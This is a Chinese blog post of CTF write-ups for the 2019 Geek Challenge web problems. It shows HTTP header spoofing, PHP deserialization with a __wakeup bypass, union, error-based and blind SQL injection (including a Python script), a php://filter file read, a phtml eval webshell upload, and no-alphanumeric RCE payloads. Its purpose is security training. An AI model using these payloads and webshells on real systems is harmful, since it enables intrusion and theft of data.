---
title: "极客大挑战2019wp--web(已做完)"
date: 2024-11-11T14:43:57+08:00
summary: "极客大挑战2019wp"
url: "/posts/极客大挑战2019wp--web(已做完)/"
categories:
  - "赛题wp"
tags:
  - "极客大挑战2019"
draft: false
---

# 0x01前言

听说极客大挑战的题目挺好的，刚好ctfshow做累了，就去一个个复现去做题积累经验

# 0x02赛题

## [极客大挑战 2019]Http

打开题目

![image-20241111144846929](image/image-20241111144846929.png)

搜罗一圈之后没看到什么，Ctrl+u看一下源代码，然后在里面发现了一个Secret.php，访问看看

![image-20241111145020815](image/image-20241111145020815-1731307826332-2.png)

意思是我们不是来自https://Sycsecret.buuoj.cn的访问，一看就知道是请求头信息伪造了

### 知识点:请求头大全

Header			解释							示例

Accept			指定客户端可以接收的内容类型	Accept:application/json, text/plain, **/**

Accept-Charset	浏览器能够接受的字符编码集。	Accept-Charset: iso-8859-5

Accept-Encoding	指定浏览器能够支持的web服务器返回内容压缩编码类型。	Accept-Encoding: gzip, deflate, br

Accept-Language	浏览器可接受的语言			Accept-Language: zh-CN,zh;q=0.9

Accept-Ranges	能够请求网页实体的一个或者多个子范围字段	Accept-Ranges: bytes

Authorization		HTTP受权的受权证书			Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==

Cache-Control		指定请求和响应遵循的缓存机制	Cache-Control: max-age=0

Connection		表示是否须要持久链接。（HTTP 1.1默认进行持久链接）	Connection: keep-alive

Cookie			HTTP请求发送时，会把保存在该请求域名下的全部cookie值一块儿发送给web服务器。	Cookie: OUTFOX_SEARCH_USER_ID=280392207@10.110.96.158

Content-Length	请求的内容长度	Content-Length: 348

Content-Type		请求的与实体对应的MIME信息		Content-Type: application/json;charset=UTF-8

Date			请求发送的日期和时间				Date: Tue, 15 Nov 2010 08:12:31 GMT

Expect			请求的特定的服务器行为			Expect: 100-continue

**From			发出请求的用户的Email				From: user@email.com**

Host				指定请求的服务器的域名和端口号	Host: www.baidu.com

If-Match			只有请求内容与实体相匹配才有效		If-Match: “737060cd8c284d8af7ad3082f209582d”

If-Modified-Since	若是请求的部分在指定时间以后被修改则请求成功，未被修改则返回304代码	If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT

If-None-Match		若是内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变	If-None-Match: “737060cd8c284d8af7ad3082f209582d”

If-Range			若是实体未改变，服务器发送客户端丢失的部分，不然发送整个实体。参数也为Etag	If-Range: “737060cd8c284d8af7ad3082f209582d”

If-Unmodified-Since	只在实体在指定时间以后未被修改才请求成功	If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT

Max-Forwards			限制信息经过代理和网关传送的时间		Max-Forwards: 10

Pragma				用来包含实现特定的指令				Pragma: no-cache

Proxy-Authorization		链接到代理的受权证书						Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==

Range				只请求实体的一部分，指定范围						Range: bytes=500-999

**Referer				先前网页的地址，当前请求网页紧随其后,即来路			Referer: www.baidu.com**

TE					客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息	TE: trailers,deflate;q=0.5

Upgrade				向服务器指定某种传输协议以便服务器进行转换（若是支持）	Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11

**User-Agent			User-Agent的内容包含发出请求的用户信息				User-Agent: Mozilla/5.0 (Linux; X11)**

**Via					通知中间网关或代理服务器地址，通讯协议						Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)**

Warning				关于消息实体的警告信息								Warn: 199 Miscellaneous warning

**X-Forwarded-For		用来说明从哪里来的，一般用来内网伪装			X-Forwarded-For: 127.0.0.1**

那就用bp抓包看看

![image-20241111145609789](image/image-20241111145609789-1731308171053-4.png)

#### 1.Referer伪造请求来源网页

发现并没有referer头，那就只能自己伪造一个了

Referer: https://Sycsecret.buuoj.cn

(记得放中间哈，放最后可能会send不出来)

![image-20241111150156390](image/image-20241111150156390-1731308518660-6.png)

#### 2.User-Agent伪造请求用户

User-Agent: Syclover

![image-20241111150217001](image/image-20241111150217001-1731308538274-8.png)

#### 3.X-Forwarded-For内网伪装

X-Forwarded-For: 127.0.0.1

![image-20241111150322118](image/image-20241111150322118-1731308603740-10-1731308605708-12-1731308607620-14-1731308609277-16.png)

成功拿到flag！

## [极客大挑战 2019]PHP

![image-20241111150708988](image/image-20241111150708988-1731308832350-1.png)

他说他有备份网址的习惯，盲猜是信息泄露

先看看源代码

![image-20241111150853118](image/image-20241111150853118-1731308934392-3.png)

### **网站备份文件漏洞:**

- 网站备份压缩文件 漏洞成因:在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。
- **该漏洞的成因**主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。
- 该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。
- 被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。

没什么可用的信息，那就扫一下目录

`dirsearch -u "url" -e*`

目录文件有点多，我闲着无聊就猜测一下是不是www.zip

url/www.zip

发现真的有

解压下来看看

![image-20241111151654323](image/image-20241111151654323-1731309415345-5.png)

我以为到这里就结束了，结果发现是假的flag

那就开其他文件看看

在index.php中发现是页面源码，但多了几行代码

```php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
```

php反序列化

那我们再看看class.php

```php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
            
        }
    }
}
?>
```

php反序列化

先审代码

### __construct()魔术方法

构造函数，当一个对象创建时被调用

这里是对username和password进行初始化赋值

### __wake()魔术方法

**调用unserialize()时触发**，反序列化恢复对象之前调用该方法，正常来说`wakeup`魔术方法会先被触发，然后再进行反序列化

这里触发wakeup方法会将username赋值成guest

### __destruct()魔术方法

析构函数，**当一个对象销毁时被调用**

里面有两个判断句，第一个是当password不等于100的时候会执行die()函数；第二个是当username等于admin的时候会输出flag

所以我们需要让username等于admin和password为100就可以拿到flag

我们构造pop链

**Name::construct()->Name::destruct()**

paylaod:

```
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

}
$a  = new Name("admin","100");
echo serialize($a);
?>
```

输出处理的反序列化字符串是:
`O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}`

为了避免触发wakeup魔术方法，我们还需要绕过方法

### 绕过wakeup方法其一

当目标类的成员属性个数大于实际个数的时候，可以绕过wakeup魔术方法，我们把反序列化字符串改一下

```
O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}
```

然后在属性那加上%00(因为成员属性类型是private，详细可以参考三种不同属性的序列化后字符串的格式)

```
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
```

传入参数就可以拿到flag了

## [极客大挑战 2019]EasySQL

打开是一个登录界面

![image-20241111154133618](image/image-20241111154133618-1731310894787-7.png)

传入1/1

![image-20241111154205265](image/image-20241111154205265-1731310926448-9.png)

1.判断是否存在注入

用单引号闭合试试看看是否存在注入

![image-20241111154338754](image/image-20241111154338754-1731311019919-11.png)

如果页面报错，且报错信息中包含SQL语法错误或未闭合的引号等，则可能是SQL注入点，说明存在注入

2.利用万能密码闭合

试一下万能密码

1’ or ‘1’=’1’#

发现flag出来了，说明万能密码是可以做的

首先学习一下sql语句逻辑运算符的优先级，由于SQL语句中逻辑运算符的优先级（=优先于AND，AND优先于OR），以及字符串拼接的特性，上述SQL语句实际上会被解析为两部分：

SELECT*FROM table_name WHERE username=’1’ or ‘1’=’1’#’;and password=’1’

其中，1=1恒为真。由于OR运算符的两侧只要有一侧为真，整个表达式就为真，因此整个查询条件就恒为真。这导致无论密码是什么，只要用户名是万能密码，用户都能通过验证。

输入后成功获取flag

## [极客大挑战 2019]LoveSQL

![image-20250121004804689](image/image-20250121004804689.png)

万能密码能登进去但是没啥可用的信息

常规的union联合注入就可以打

```
plaintext
1' union select 1,2,3#回显位置为2和3
1' union select 1,2,database()#数据库名为geek
1' union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema='geek')#表名为geekuser,l0ve1ysq1
1' union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name='l0ve1ysq1')#列名为id,username,password
1' union select 1,2,(select password from geek.l0ve1ysq1 where username='flag')#如果不加where子语句的话返回结果很长无法正常回显，所以我盲猜的flag
```

## [极客大挑战 2019]BabySQL

题目界面是一样的，但可以看到作者对网站进行了一定的加固

![image-20241111155420887](image/image-20241111155420887-1731311661949-13-1742810078858-63.png)

常规做法，先试一下万能密码

1’ or 1=1#

发现or不见了，猜测是被过滤了，

![image-20241111190347533](image/image-20241111190347533-1731323029026-47.png)

可以再试试order，发现最后只剩der了，可以确定是or和by都被过滤了

后面测试发现union,select这些关键词都被过滤了

试一下双写绕过，发现可以绕过,应该绕过方法都是一样的，那就构造payload

```
plaintext
1' oorrder bbyy 4#出错，字段数为3
1' ununionion seselectlect 1,2,3#回显位置为2和3
1' ununionion seselectlect 1,2,database()#数据库名为geek
1' ununionion seselectlect 1,2,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql')#表名为b4bsql,geekuser
1' ununionion seselectlect 1,2,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql')#列名为id,username,password
-1' ununionion seselectlect 1,2,(seselectlect passwoorrd frfromom geek.b4bsql whwhereere username='flag')#
```

## [极客大挑战 2019]HardSQL

![image-20250121124832767](image/image-20250121124832767.png)

传入关键词发现有警告，双写和大小写都没办法绕过，然后测出来发现sleep，union，substr等函数名都被过滤了

可以用报错注入

```
-1'or(updatexml(1,concat(0x7e,(select(database())),0x7e),3))#
XPATH syntax error: '~geek~'
空格被过滤了，我们用括号去绕过
-1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#
XPATH syntax error: '~H4rDsq1~'
等于号也被过滤了，用like绕过

-1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#
XPATH syntax error: '~id,username,password~'

-1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)where(username)like('flag')),0x7e),1))#
XPATH syntax error: '~flag{e6f22b98-2bd0-4db8-9083-af'
漏了一部分flag，我们用right函数去拿

-1'or(updatexml(1,concat(0x7e,(select(right(password,14))from(H4rDsq1)where(username)like('flag')),0x7e),1))#
忘记复制粘贴了.....
```

## [极客大挑战 2019]FinalSQL

![image-20250121011804340](image/image-20250121011804340.png)

分别点击那几个数字之后没啥可用的信息，但是我们在url中发现id参数，fuzz一下发现引号被过滤了，测出`^`符号可以使用，可以试试盲注

```
plaintext
?id=1^(length(database())>1)页面返回error
```

能打那就直接上脚本

```py
import requests

url="http://968a873e-bab6-4c98-89f0-71a63e1d8708.node5.buuoj.cn:81/search.php"

flag=""
for i in range(1,100):
    for j in range(32,128):
        payload=f"?id=1^(ascii(substr((Select(group_concat(password))from(F1naI1y)where(username='flag')),{i},1))={j})--+"
        r=requests.get(url+payload)
        if "ERROR" in r.text:
            flag +=chr(j)
            print(flag)
            break
print(str(flag))
```

## [极客大挑战 2019]Havefun

打开页面

![image-20241111173046086](image/image-20241111173046086-1731317448508-15.png)

查看页面源代码发现一段隐藏代码

```
                <!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
        -->
```

直接get传入cat=dog就可以拿到flag了

## [极客大挑战 2019]Secret File

查看题目

![image-20241111173758449](image/image-20241111173758449-1731317879848-19.png)

看看源代码有没有可用的信息

![image-20241111175056679](image/image-20241111175056679-1731318658497-21.png)

发现一个Archive_room.php

访问看看

![image-20241111175119374](image/image-20241111175119374-1731318681097-23.png)

有一个按钮链接，点一下就跳转结束了

![image-20241111175201233](image/image-20241111175201233-1731318722812-25.png)

那就抓包再send一次试试

![image-20241111175315956](image/image-20241111175315956-1731318797510-27.png)

看到了一个被注释掉的secr3t.php

![image-20241111175355811](image/image-20241111175355811-1731318837374-29.png)

是include()包含rce代码执行

- include()函数

**include就是包含文件的函数，把$file的内容包含进来.**

**include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来**

- strstr()函数

`strstr` 函数用于查找一个字符串在另一个字符串中的首次出现。如果找到了，它会返回从匹配位置到字符串末尾的部分；如果没有找到，则返回 `false`。`strstr` 是区分大小写的。

- 函数原型

```
php
string strstr ( string $haystack , string $needle [, bool $before_needle = false ] )
```

1. **`$haystack`**：要搜索的字符串，即干草堆。
2. **`$needle`**：要查找的子字符串，即针。
3. **`$before_needle`**（可选）：如果设置为 `true`，则返回 `$needle` 出现之前的部分；如果未设置或设置为 `false`，则返回从 `$needle` 出现的位置开始到 `$haystack` 末尾的部分。

解析代码:

```
if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data"))
```

用strstr去匹配这些字符串，如果符合则会进行if语句执行exit

既然input和data被禁用了，很明显了，我们可以用filter伪协议去读文件

php://filter/convert.base64-encode/resource=flag.php

然后会返回base64编码的字符串，解码一下就可以看到flag了

![image-20241111180542885](image/image-20241111180542885-1731319544378-31.png)

## [极客大挑战 2019]Knife

打开题目就看到了一句话木马

![image-20241111181358741](image/image-20241111181358741-1731320040380-33.png)

但因为我们不确定这个一句话木马是不是写在这个网站下

先看看源码

![image-20241111181515797](image/image-20241111181515797-1731320116909-35.png)

查看源码发现一句话木马是写在当前网站下的

那就直接用蚁剑连，密码就是Syc，连上后在更目录就可以zhao'd

(其实我个人理解蚁剑就是一个自动的rce工具，密码就是传入rce的参数，蚁剑可以通过这个参数执行命令获取目录以及文件内容，并整合起立返回给我们)

## [极客大挑战 2019]Upload

![image-20241111183058737](image/image-20241111183058737-1731321059960-37.png)

黑盒测试的文件上传漏洞

先传一个一句话木马文件试试，发现有文件类型限制

![image-20241111183232544](image/image-20241111183232544-1731321153685-39.png)

抓包修改文件后缀判断一下是不是前端验证，然后发现

![image-20241111185030775](image/image-20241111185030775-1731322231946-41.png)

可见是对文件后缀过滤了php，试试绕过后缀，发现双写可以绕过，但是对`<?`进行了过滤，那我们换成phtml格式的一句话木马

![image-20241111185201905](image/image-20241111185201905-1731322322914-43.png)

绕过文件后缀验证了，但也对文件内容进行了检查

那就直接用phtml一句话木马去做吧

```php
phtml
<script language="php">eval($_REQUEST[cmd])</script>
```

传上去然后修改了conten头，但还是被警告了得上传图片

![image-20241111185556170](image/image-20241111185556170-1731322557379-45.png)

那就伪造一下jpg格式

### GIF89a伪造jpg格式文件

前面加上GIF89a，这个可以伪造成jpg格式的文件。

上传后显示上传成功，猜测是在/upload路径下

于是访问/upload/1.phtml，成功后用蚁剑进行连接，就可以找到flag

## [极客大挑战 2019]BuyFlag

打开题目，在menu里面找到flag的有关网站

![image-20241111193758763](image/image-20241111193758763-1731325079995-49.png)

看到需要验证学生的身份，猜测是cookie有关的，那就先抓包看看

![image-20241111193841804](image/image-20241111193841804-1731325122814-51.png)

看到隐藏代码，意思是我们需要post传入两个参数，money的值根据页面来说我们需要100000000money才能买flag，password的话需要绕过验证且值为404，可以看到这里是弱比较，所以404a或者404abc都能通过验证，那就传参吧(记得修改请求包，改成post请求包)

![image-20241111194130278](image/image-20241111194130278-1731325291368-53.png)

可以看到我们是成功通过验证了，但显示需要学生的身份，这时候我们可以注意到cookie有一个参数user等于0，cookie通常被用作身份验证，猜测把user改成1就行了，因为0表示false，1表示true

**这边显示密码正确，身份验证也对了，但是money错误，怀疑是长度问题。（you have not enough money,loser~）**

![image-20241111194400685](image/image-20241111194400685.png)

试着把money改成数组形式或者用科学计数法就可以了

## [极客大挑战 2019]RCE ME

```php
php
<?php
error_reporting(0);
if(isset($_GET['code'])){
    $code=$_GET['code'];
         if(strlen($code)>40){
                die("This is too Long.");
        }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                        die("NO.");
                    }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>
```

rce代码执行

审代码

我们通过get传入一个参数code，这个参数必须满足以下条件

- code参数的字符串长度不能大于40
- 绕过preg_match正则匹配的字符

preg_match(“/[A-Za-z0-9]+/“,$code

- **`A-Za-z0-9]`**：表示字符集，匹配任意一个字母（大写或小写）或数字。
- **`+`**：表示前面的字符集可以出现一次或多次。

这就是很经典的无字母无数字rce

可参考的做法就是用异或，取反，自增（这里限制了长度，所以自增不可以）进行构造payload

我这里直接用取反方法给payload了，方法的话直接参考这三种方法构造payload就行

payload:

取反脚本

```
php
<?php
$c='phpinfo()';
$d=urlencode(~$c);
$e=~($d);
// if(preg_match("/[A-Za-z0-9]+/",$e)){
//     echo 0;
// }else {
//     echo 1;
// }
echo $d;
?>
url/?code=(~%8F%97%8F%96%91%99%90)();
plaintext
disable_functions:

pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl
```

这么多函数都被禁用了，我们想办法代入`antsword`处理

先看一下php的版本

```
plaintext
PHP Version 7.0.33`在7.2之前，构造`assert(eval($_POST[a]));
php
<?php 
$a='assert';
$b=urlencode(~$a);
echo $b;
echo "\n";
$c='eval($_POST[a])';
$d=urlencode(~$c);
echo $d;
?>
```

上传后进行访问，用蚁剑进行连接，但发现readflag无法读取，权限设置也读不了，这时候可以用蚁剑的插件

![image-20241111204701806](image/image-20241111204701806-1731329222948-55.png)

然后

![image-20250121173054824](image/image-20250121173054824.png)

可以看到终端出来了，我们直接/readflag就可以拿到flag了
